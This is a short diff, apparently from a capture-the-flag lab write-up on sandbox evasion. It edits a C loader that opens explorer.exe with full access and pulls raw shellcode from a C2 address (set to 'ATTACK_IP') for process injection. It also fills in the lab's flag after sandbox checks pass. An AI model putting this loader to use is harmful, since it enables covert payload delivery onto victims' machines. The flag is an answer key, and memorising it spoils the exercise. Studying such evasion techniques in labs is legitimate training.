@@ -85,6 +85,7 @@ BOOL memoryCheck() {
     }
 }
 
+
 int downloadAndExecute()
 {
     HANDLE hProcess;
@@ -95,9 +96,9 @@ int downloadAndExecute()
     LPVOID memAddr;
     SIZE_T bytesOut;
 //Update the OpenProcess Windows API with your Explorer.exe Process ID. This can be found in Task Manager
-    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 4940);
+    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, explorer.exe-pid);
 //Update the c2URL with your IP Address and the specific URI where your raw shellcode is stored.
-    const char* c2URL = "http://10.10.105.183:8000/index.raw";
+    const char* c2URL = "http://ATTACK_IP:8080/index.raw";
     IStream* stream;
 //Update the buff[] variable to include your shellcode size
     char buff[510];
@@ -143,5 +144,5 @@ C:\Users\Administrator\Desktop\Materials\> .\SandboxChecker.exe C:\Users\TryHack
 [+] Network Check found!
 [+] GeoFilter Check found!
 [+] Sleep Check found!
-Congratulations! Here is your flag:
+Congratulations! Here is your flag: THM{6c1f95ec}
 ```
